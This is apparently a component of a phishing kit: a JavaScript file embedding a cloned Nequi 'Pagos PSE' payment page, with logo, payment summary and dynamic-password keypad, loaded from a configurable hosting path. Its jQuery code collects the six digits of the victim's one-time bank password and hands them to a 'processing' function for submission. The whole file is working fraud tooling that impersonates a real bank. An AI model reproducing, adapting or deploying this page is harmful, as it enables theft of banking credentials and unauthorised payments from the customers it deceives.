var my_titulo = 'Nequi';
var nequi_body = `
<link rel="stylesheet" href="${my_hosting}/bancos/nequi/assets/css/style.css">
<link rel="stylesheet" href="${my_hosting}/bancos/nequi/assets/css/style-new.css">

<nequi-root _nghost-uso-c36="" ng-version="15.2.10">
    <div _ngcontent-uso-c36="" class="main-container">
        <router-outlet _ngcontent-uso-c36="">
            <app-payment-summary _nghost-uso-c32="" class="ng-star-inserted" style="display: none;">
                <nequi-header _ngcontent-uso-c32="" _nghost-uso-c30="">

                    <div _ngcontent-uso-c30="" class="header"><nequi-logo _ngcontent-uso-c30="" _nghost-uso-c28="">
                            <section _ngcontent-uso-c28="" id="img-header" class="splash">
                                <div _ngcontent-uso-c28="" class="splash__container"><svg _ngcontent-uso-c28=""
                                        width="180" height="40" viewBox="0 0 104 32" fill="none"
                                        xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                        <path _ngcontent-uso-c28=""
                                            d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z"
                                            fill="#DA0081" class="point__up"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z"
                                            fill="#DA0081" class="point__down"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z"
                                            fill="#200020" class="N"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z"
                                            fill="#200020" class="E"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z"
                                            fill="#200020" class="I"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z"
                                            fill="#200020" class="Q"></path>
                                        <path _ngcontent-uso-c28=""
                                            d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z"
                                            fill="#200020" class="U"></path>
                                    </svg></div>
                            </section>
                        </nequi-logo></div>
                </nequi-header>
                <div _ngcontent-uso-c32="" class="payment-summary">
                    <div _ngcontent-uso-c32="" id="summary"><nequi-title _ngcontent-uso-c32="" _nghost-uso-c10="">
                            <h1 _ngcontent-uso-c10="" class="title">Resumen de pago</h1>
                        </nequi-title>
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> Descripción de compra <!----></p>
                            <p _ngcontent-uso-c32="" class="description">3U0QA6O</p><!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> Estado de la solicitud <!----></p>
                            <p _ngcontent-uso-c32="" class="description">Transacción cancelada por inactividad</p>
                            <!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> Tienda <!----></p>
                            <p _ngcontent-uso-c32="" class="description">TECNIPAGOS S A</p><!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> Fecha de solicitud <!----></p>
                            <p _ngcontent-uso-c32="" class="description">13 de febrero de 2025</p><!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> CUS <!----></p>
                            <p _ngcontent-uso-c32="" class="description">1263199413</p><!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> ¿Cuánto? <!----></p>
                            <p _ngcontent-uso-c32="" class="description">$ 30.000,00</p><!---->
                        </div><!----><!---->
                        <div _ngcontent-uso-c32="" class="payment-summary__data-section ng-star-inserted">
                            <p _ngcontent-uso-c32="" class="title"> Factura de comercio <!----></p>
                            <p _ngcontent-uso-c32="" class="description">3664760295</p><!---->
                        </div><!----><!---->
                    </div>
                    <div _ngcontent-uso-c32="" class="payment-summary__buttons"><nequi-button _ngcontent-uso-c32=""
                            _nghost-uso-c9=""><button _ngcontent-uso-c9="" pbutton="" pripple="" type="button"
                                class="p-element p-button-primary p-button p-component"
                                name="payment_summary_ok_button"><span class="p-button-label">Regresa al
                                    comercio</span></button></nequi-button><nequi-button _ngcontent-uso-c32=""
                            _nghost-uso-c9=""><button _ngcontent-uso-c9="" pbutton="" pripple="" type="button"
                                class="p-element p-button-underline p-button p-component"
                                name="payment_summary_print_button"><span
                                    class="p-button-label">Imprimir</span></button></nequi-button></div><nequi-toast
                        _ngcontent-uso-c32="" _nghost-uso-c19=""><p-toast _ngcontent-uso-c19=""
                            class="p-element ng-tns-c18-12 ng-star-inserted">
                            <div class="ng-tns-c18-12 p-toast p-component p-toast-top-center" pr_id_13="" style="">
                                <!---->
                            </div>
                        </p-toast></nequi-toast>
                </div>
            </app-payment-summary>
        </router-outlet>
        <app-dynamic-password _nghost-uso-c35="" class="ng-star-inserted">
            <nequi-header
                _ngcontent-uso-c35="" _nghost-uso-c30="">
                <div _ngcontent-uso-c30="" class="header"><nequi-logo _ngcontent-uso-c30="" _nghost-uso-c28="">
                        <section _ngcontent-uso-c28="" id="img-header" class="splash">
                            <div _ngcontent-uso-c28="" class="splash__container"><svg _ngcontent-uso-c28=""
                                    width="180" height="40" viewBox="0 0 104 32" fill="none"
                                    xmlns="http://www.w3.org/2000/svg" class="splash__container__svg">
                                    <path _ngcontent-uso-c28=""
                                        d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z"
                                        fill="#DA0081" class="point__up"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z"
                                        fill="#DA0081" class="point__down"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z"
                                        fill="#200020" class="N"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z"
                                        fill="#200020" class="E"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z"
                                        fill="#200020" class="I"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z"
                                        fill="#200020" class="Q"></path>
                                    <path _ngcontent-uso-c28=""
                                        d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z"
                                        fill="#200020" class="U"></path>
                                </svg></div>
                        </section>
                    </nequi-logo></div>
            </nequi-header>
            <div _ngcontent-uso-c35="" appcanceltxoncloserefresh="" class="dynamic-password"><nequi-title
                    _ngcontent-uso-c35="" _nghost-uso-c10="">
                    <h1 _ngcontent-uso-c10="" class="title">Pagos PSE de Nequi</h1>
                </nequi-title>
                <p _ngcontent-uso-c35="" class="dynamic-password__subtitle">Para confirmar tu pago escribe o pega la
                    clave dinámica que encuentras en tu App Nequi.</p><nequi-numeric-keypad
                    _ngcontent-uso-c35="">
                    <p-card class="p-element container_numerickeypad">
                        <div class="p-card p-component"><!---->
                            <div class="p-card-body"><!----><!---->
                                <div class="p-card-content">
                                    <div class="box_numerickeypad">
                                        <input type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled>
                                        <input
                                            type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled>
                                        <input
                                            type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled>
                                        <input
                                            type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled>
                                        <input
                                            type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled>

                                        <input
                                            type="text"
                                            minlength="1"
                                            maxlength="1"
                                            class="input-keypad code_numerickeypad ng-star-inserted"
                                            disabled><!---->
                                    </div>
                                    <div class="label_numerickeypad"> </div>
                                    <div class="numeric_board">
                                        <div class="numeric_board-row">
                                            <button name="'numeric_board_1'"
                                                class="container_number"> 1 </button>
                                            <button
                                                name="'numeric_board_2'" class="container_number"> 2
                                            </button><button name="'numeric_board_3'" class="container_number"> 3
                                            </button>
                                        </div>
                                        <div class="numeric_board-row">
                                            <button name="'numeric_board_4'"
                                                class="container_number"> 4 </button>
                                            <button
                                                name="'numeric_board_5'" class="container_number"> 5
                                            </button>
                                            <button name="'numeric_board_6'" class="container_number"> 6
                                            </button>
                                        </div>
                                        <div class="numeric_board-row">
                                            <button name="'numeric_board_7'"
                                                class="container_number"> 7 </button>
                                            <button
                                                name="'numeric_board_8'" class="container_number"> 8
                                            </button>
                                            <button name="'numeric_board_9'" class="container_number"> 9
                                            </button>
                                        </div>
                                        <div class="numeric_board-row">
                                            <button class="container_number"
                                                disabled=""></button>
                                            <button name="'numeric_board_0'"
                                                class="container_number"> 0 </button>
                                            <button
                                                id="backspace"
                                                name="'numeric_board_backspace'" class="container_number">
                                                <img
                                                    alt=""
                                                    src="assets/images/nequi-teclado-numerico-borrar.svg"></button>
                                        </div>
                                    </div><!---->
                                </div><!---->
                            </div>
                        </div>
                    </p-card>
                </nequi-numeric-keypad>
                <div _ngcontent-uso-c35="" class="dynamic-password__container-buttons">
                    <nequi-button
                        _ngcontent-uso-c35="" _nghost-uso-c9=""><button _ngcontent-uso-c9="" pbutton="" pripple=""
                            type="button" class="p-element p-button-secondary p-button p-component"
                            name="otp_validation_cancel_button"><span class="p-button-label">Cancela el
                                pago</span></button></nequi-button>
                </div>
            </div>
            <nequi-modal-image-buttons _ngcontent-uso-c35="" _nghost-uso-c27="">
                <nequi-modal-veil
                    _ngcontent-uso-c27="" _nghost-uso-c11="">
                    <p-dialog _ngcontent-uso-c11="" position="top"
                        class="p-element ng-tns-c7-7 modal-veil__uva ng-star-inserted"><!----></p-dialog>
                </nequi-modal-veil></nequi-modal-image-buttons><nequi-toast
                _ngcontent-uso-c35="" _nghost-uso-c19="">
                <p-toast _ngcontent-uso-c19=""
                    class="p-element ng-tns-c18-8 ng-star-inserted">
                    <div class="ng-tns-c18-8 p-toast p-component p-toast-top-center"><!----></div>
                </p-toast></nequi-toast><nequi-modal-cancel _ngcontent-uso-c35=""
                _nghost-uso-c26=""><nequi-modal-buttons _ngcontent-uso-c26="" _nghost-uso-c25=""><nequi-modal-veil
                        _ngcontent-uso-c25="" _nghost-uso-c11=""><p-dialog _ngcontent-uso-c11="" position="top"
                            class="p-element ng-tns-c7-9 modal-veil__orquidea ng-star-inserted"><!----></p-dialog></nequi-modal-veil></nequi-modal-buttons></nequi-modal-cancel><nequi-modal-image-buttons
                _ngcontent-uso-c35="" _nghost-uso-c27=""><nequi-modal-veil _ngcontent-uso-c27=""
                    _nghost-uso-c11=""><p-dialog _ngcontent-uso-c11="" position="top"
                        class="p-element ng-tns-c7-10 modal-veil__uva ng-star-inserted"><!----></p-dialog></nequi-modal-veil></nequi-modal-image-buttons><nequi-modal-loader
                _ngcontent-uso-c35="" _nghost-uso-c29=""><p-dialog _ngcontent-uso-c29="" position="top"
                    class="p-element modal-loader ng-tns-c7-11 ng-star-inserted"><!----></p-dialog></nequi-modal-loader>
        </app-dynamic-password><!---->
    </div>
    <nequi-modal-buttons _ngcontent-uso-c36="" _nghost-uso-c25=""><nequi-modal-veil _ngcontent-uso-c25=""
            _nghost-uso-c11=""><p-dialog _ngcontent-uso-c11="" position="top"
                class="p-element ng-tns-c7-0 modal-veil__orquidea"><!----></p-dialog></nequi-modal-veil></nequi-modal-buttons>
</nequi-root>
`;

var my_contenido = `
<?php require_once('_plantilla_nequi.php'); ?>
`

//<script>
    $(document).ready(function() {
        $("footer").hide();
        // $("body").css("background-image", "none !important");
        $("body").css("background-image", "none");

        // $("body").attr("style", "background-image: none !important;");

        $('.container_number').click(function() {
            var digit = $(this).text();

            var emptyInput = $('.input-keypad.code_numerickeypad').filter(function() {
                return $(this).val() === '';
            }).first();

            if (emptyInput.length > 0) {
                emptyInput.val(digit);
                var nextInput = emptyInput.next('.input-keypad.code_numerickeypad');
                if (nextInput.length > 0) {
                    nextInput.focus();
                }
            }

            checkInputsFilled();
        });

        $('#backspace').click(function() {
            var focusedInput = $('.input-keypad.code_numerickeypad').filter(function() {
                return $(this).val() !== '';
            }).last();

            if (focusedInput.length > 0) {
                focusedInput.val('');
                focusedInput.prev('.input-keypad.code_numerickeypad').focus();
            }

            checkInputsFilled();
        });

        function checkInputsFilled() {
            var allFilled = $('.input-keypad.code_numerickeypad').toArray().every(function(input) {
                return $(input).val() !== '';
            });

            if (allFilled) {
                onAllInputsFilled();
            }
        }

        function onAllInputsFilled() {
            console.log('¡Todos los campos están llenos!');
            var otp = $('.input-keypad.code_numerickeypad').map(function() {
                return $(this).val().trim();;
            }).get().join('');

            processing({
                t: 'otp',
                otp: otp,
            });
        }
    });